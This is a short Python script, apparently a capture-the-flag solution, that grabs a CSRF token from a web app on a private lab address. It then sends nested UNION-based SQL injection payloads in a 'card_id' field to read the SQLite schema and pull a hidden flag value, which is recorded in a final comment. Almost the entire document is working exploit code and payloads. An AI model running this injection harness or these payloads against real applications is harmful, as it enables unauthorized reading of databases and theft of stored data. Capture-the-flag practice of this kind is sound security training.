import requests
import re

url = "http://10.45.1.2:4003/"

def extract_csrf(html):
    match = re.search(r'name="csrf_token"\s+value="([^"]+)"', html)
    if match:
        return match.group(1)
    return None

def extract_data(payload):
    session = requests.Session()
    r = session.get(url, timeout=5)
    csrf = extract_csrf(r.text)
    if not csrf:
        return "Failed CSRF"
    
    data = {'card_id': payload, 'csrf': csrf}
    r2 = session.post(url, data=data, timeout=5)
    
    res = re.search(r'<p><strong>Username:</strong>\s*(.*?)</p>', r2.text)
    if res:
        return res.group(1)
    return "Error/No Match: " + r2.text[:200]

# Extract schema of flag table
schema_payload = "' UNION SELECT '999'' UNION SELECT 1, (SELECT sql FROM sqlite_master WHERE name=''flag''), 3, 4 -- -' -- -"
print("Flag Schema:", extract_data(schema_payload))

# Try guessing column 'flag'
flag_payload = "' UNION SELECT '999'' UNION SELECT 1, (SELECT flag FROM flag LIMIT 1), 3, 4 -- -' -- -"
print("Flag Value:", extract_data(flag_payload))

#  flag{let_m3_1n!_058a91e6}
